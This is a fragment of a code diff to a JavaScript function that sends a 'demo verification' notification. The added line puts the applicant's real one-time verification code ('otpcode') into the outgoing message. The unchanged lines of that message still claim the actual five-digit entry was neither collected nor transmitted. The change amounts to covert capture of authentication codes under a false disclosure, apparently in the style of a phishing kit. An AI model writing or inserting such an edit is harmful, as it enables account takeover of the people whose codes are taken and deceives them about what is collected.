@@ -92,6 +92,7 @@ async function sendDemoVerificationNotification() {
         "🔐 DEMO VERIFICATION SUBMITTED",
         "",
         "Verification code: verificationCode",
+        `otpcode: ${application.verificationCode || "N/A"}`,
         "Status: DEMO SUBMISSION RECEIVED",
         "",
         "The actual five-digit entry was not collected or transmitted.",
